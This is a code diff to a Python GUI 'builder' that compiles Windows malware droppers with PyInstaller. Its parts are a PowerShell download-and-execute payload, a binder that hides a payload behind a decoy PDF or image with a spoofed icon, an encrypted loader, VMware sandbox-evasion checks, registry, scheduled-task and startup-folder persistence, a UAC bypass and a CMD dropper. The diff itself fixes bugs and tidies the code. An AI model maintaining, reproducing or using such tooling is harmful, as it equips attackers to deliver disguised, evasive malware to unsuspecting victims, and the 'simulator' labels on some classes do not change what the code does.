@@ -8,12 +8,7 @@ import subprocess
 import shutil
 import base64
 import hashlib
-import time
 import threading
-import contextlib
-import winreg # Required for the VM check logic context
-from datetime import datetime
-from PIL import Image
 
 # =============================================================================
 # SHARED RESOURCES & TEMPLATES
@@ -113,14 +108,11 @@ Start-Process -FilePath $FinalFilePath -NoNewWindow
 PS_EXEC_FUNCTION = textwrap.dedent("""\
 def execute_powershell_script(ps_content, delay_start):
     # Local imports ensure the function has everything it needs
-    import time
     import base64
     import subprocess
     import sys
-    
-    try:
-        time.sleep(delay_start)
 
+    try:
         # 1. Encode the payload
         ps_script_bytes = ps_content.encode('utf-16le')
         ps_b64 = base64.b64encode(ps_script_bytes).decode('utf-8')
@@ -176,6 +168,7 @@ class LogicConfigGen:
     @staticmethod
     def generate(url, download_path, filename, delay_start, delay_wait, enable_vm, output_exe, log_widget):
         # Redirect output
+        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
         sys.stdout = IORedirector(log_widget)
         sys.stderr = IORedirector(log_widget)
         
@@ -222,14 +215,13 @@ if __name__ == "__main__":
         # Compilation
         temp_dir = tempfile.mkdtemp()
         temp_py_file = os.path.join(temp_dir, "temp_runner.py")
-        
+        output_dir = os.path.dirname(output_exe)
+        exe_name = os.path.basename(output_exe)
+
         try:
             with open(temp_py_file, 'w', encoding='utf-8') as f:
                 f.write(full_script)
-            
-            output_dir = os.path.dirname(output_exe)
-            exe_name = os.path.basename(output_exe)
-            
+
             cmd = [
                 'pyinstaller', '--onefile', '--noconsole',
                 '--name', exe_name,
@@ -254,16 +246,20 @@ if __name__ == "__main__":
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
             # Cleanup local build artifacts
-            spec = os.path.join(output_dir, exe_name.replace('.exe','.spec')) # Spec is usually in CWD or dist
-            if os.path.exists(exe_name.replace('.exe','.spec')): os.remove(exe_name.replace('.exe','.spec'))
-            if os.path.exists('build'): shutil.rmtree('build')
+            spec_file = exe_name.replace('.exe', '.spec')
+            if os.path.exists(spec_file):
+                os.remove(spec_file)
+            if os.path.exists('build'):
+                shutil.rmtree('build')
+            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
 
 class LogicSFX:
     @staticmethod
     def create_executor(payload_name, decoy_name, temp_dir, enable_vm):
         vm_code = VM_CHECK_CODE if enable_vm else ""
         vm_call = "    if is_running_on_vmware_windows(): return" if enable_vm else ""
-        
+        winreg_import = "import winreg" if enable_vm else ""
+
         script_content = f'''
 import os
 import subprocess
@@ -271,7 +267,7 @@ import tempfile
 import sys
 import shutil
 import platform
-import winreg # Needed for VM check if enabled
+{winreg_import}
 
 {vm_code}
 
@@ -290,14 +286,14 @@ def execute_payload():
 
     try:
         # Use user's temp directory for better permissions
-        temp_dir = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), 'pdf_decoy')
-        os.makedirs(temp_dir, exist_ok=True)
+        _staging_dir = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), 'pdf_decoy')
+        os.makedirs(_staging_dir, exist_ok=True)
 
         bundled_decoy_path = get_resource_path(DECOY_NAME)
         bundled_payload_path = get_resource_path(PAYLOAD_NAME)
 
-        decoy_path_out = os.path.join(temp_dir, DECOY_NAME)
-        payload_path_out = os.path.join(temp_dir, PAYLOAD_NAME)
+        decoy_path_out = os.path.join(_staging_dir, DECOY_NAME)
+        payload_path_out = os.path.join(_staging_dir, PAYLOAD_NAME)
 
         shutil.copy2(bundled_decoy_path, decoy_path_out)
         shutil.copy2(bundled_payload_path, payload_path_out)
@@ -331,6 +327,7 @@ if __name__ == '__main__':
 
     @staticmethod
     def build(payload_path, decoy_path, output_name, output_dir, enable_vm, log_widget, is_pdf_mode=False):
+        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
         sys.stdout = IORedirector(log_widget)
         sys.stderr = IORedirector(log_widget)
         
@@ -354,6 +351,7 @@ if __name__ == '__main__':
             else:
                 # Generate from decoy image
                 try:
+                    from PIL import Image
                     img = Image.open(decoy_path)
                     img.save(icon_path, format="ICO", sizes=[(32,32), (64,64), (256,256)])
                 except Exception as e:
@@ -395,6 +393,7 @@ if __name__ == '__main__':
             messagebox.showerror("Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
+            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
 
 class LogicObfuscator:
     @staticmethod
@@ -421,11 +420,14 @@ class LogicObfuscator:
 
     @staticmethod
     def build(exe_path, version_key, output_name, output_dir, enable_vm, log_widget):
+        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
         sys.stdout = IORedirector(log_widget)
         sys.stderr = IORedirector(log_widget)
-        
+
         print("[INFO] Starting Obfuscation Build...")
-        
+
+        final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
+
         try:
             with open(exe_path, 'rb') as f:
                 raw_data = f.read()
@@ -436,9 +438,10 @@ class LogicObfuscator:
             
             vm_code = VM_CHECK_CODE if enable_vm else ""
             vm_call = "    if is_running_on_vmware_windows(): return" if enable_vm else ""
-            
+            _winreg_import = ", winreg" if enable_vm else ""
+
             loader_code = textwrap.dedent(f"""
-import os, sys, subprocess, tempfile, hashlib, base64, platform, winreg
+import os, sys, subprocess, tempfile, hashlib, base64, platform{_winreg_import}
 {vm_code}
 
 def generate_key_values(version_key):
@@ -487,9 +490,7 @@ if __name__ == "__main__":
             temp_loader = os.path.join(os.getcwd(), "temp_loader.py")
             with open(temp_loader, 'w', encoding='utf-8') as f:
                 f.write(loader_code)
-                
-            final_name = output_name if output_name.endswith('.exe') else output_name + ".exe"
-            
+
             cmd = [
                 'pyinstaller', '--onefile', '--noconsole',
                 '--name', final_name,
@@ -506,10 +507,14 @@ if __name__ == "__main__":
             print(f"[ERROR] {e}")
             messagebox.showerror("Error", str(e))
         finally:
-            if os.path.exists("temp_loader.py"): os.remove("temp_loader.py")
-            if os.path.exists("build"): shutil.rmtree("build")
+            if os.path.exists("temp_loader.py"):
+                os.remove("temp_loader.py")
+            if os.path.exists("build"):
+                shutil.rmtree("build")
             spec = final_name.replace('.exe', '.spec')
-            if os.path.exists(spec): os.remove(spec)
+            if os.path.exists(spec):
+                os.remove(spec)
+            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
 
 # =============================================================================
 # SIMULATION CLASSES  (added below LogicObfuscator)
@@ -528,6 +533,7 @@ class LogicRegistryPersistence:
     @staticmethod
     def build(payload_path, key_name, output_name, output_dir,
               enable_vm, enable_cleanup, log_widget):
+        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
         sys.stdout = IORedirector(log_widget)
         sys.stderr = IORedirector(log_widget)
         print("[INFO] Starting Registry Persistence Simulator Build...")
@@ -634,6 +640,7 @@ if __name__ == "__main__":
             messagebox.showerror("Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
+            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
 
 
 class LogicScheduledTask:
@@ -649,6 +656,7 @@ class LogicScheduledTask:
     @staticmethod
     def build(payload_path, task_name, trigger, output_name, output_dir,
               enable_vm, enable_cleanup, log_widget):
+        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
         sys.stdout = IORedirector(log_widget)
         sys.stderr = IORedirector(log_widget)
         print("[INFO] Starting Scheduled Task Simulator Build...")
@@ -769,6 +777,7 @@ if __name__ == "__main__":
             messagebox.showerror("Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
+            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
 
 
 class LogicStartupFolder:
@@ -784,6 +793,7 @@ class LogicStartupFolder:
     @staticmethod
     def build(payload_path, output_name, output_dir,
               enable_vm, enable_cleanup, log_widget):
+        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
         sys.stdout = IORedirector(log_widget)
         sys.stderr = IORedirector(log_widget)
         print("[INFO] Starting Startup Folder Simulator Build...")
@@ -883,6 +893,7 @@ if __name__ == "__main__":
             messagebox.showerror("Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
+            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
 
 
 class LogicUACBypass:
@@ -900,6 +911,7 @@ class LogicUACBypass:
     @staticmethod
     def build(payload_path, output_name, output_dir,
               enable_vm, enable_cleanup, log_widget):
+        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
         sys.stdout = IORedirector(log_widget)
         sys.stderr = IORedirector(log_widget)
         print("[INFO] Starting UAC Bypass Simulator Build...")
@@ -1028,6 +1040,7 @@ if __name__ == "__main__":
             messagebox.showerror("Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
+            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
 
 
 class LogicCmdDropper:
@@ -1045,6 +1058,7 @@ class LogicCmdDropper:
     @staticmethod
     def build(url, download_path, filename, delay_start,
               output_name, output_dir, enable_vm, log_widget):
+        _saved_stdout, _saved_stderr = sys.stdout, sys.stderr
         sys.stdout = IORedirector(log_widget)
         sys.stderr = IORedirector(log_widget)
         print("[INFO] Starting CMD Dropper Simulator Build...")
@@ -1138,6 +1152,7 @@ if __name__ == "__main__":
             messagebox.showerror("Error", str(e))
         finally:
             shutil.rmtree(temp_dir, ignore_errors=True)
+            sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
 
 
 # =============================================================================
@@ -1363,7 +1378,7 @@ class UnifiedBuilderApp(tk.Tk):
             return
         if not os.path.exists("pdf.ico"):
             messagebox.showwarning("Missing Icon", "pdf.ico must be in the script directory.")
-            
+            return
         self.p_log.delete(1.0, tk.END)
         threading.Thread(target=LogicSFX.build, # Reusing SFX logic with is_pdf_mode=True
                          args=(self.p_payload.get(), self.p_decoy.get(), self.p_name.get(), 
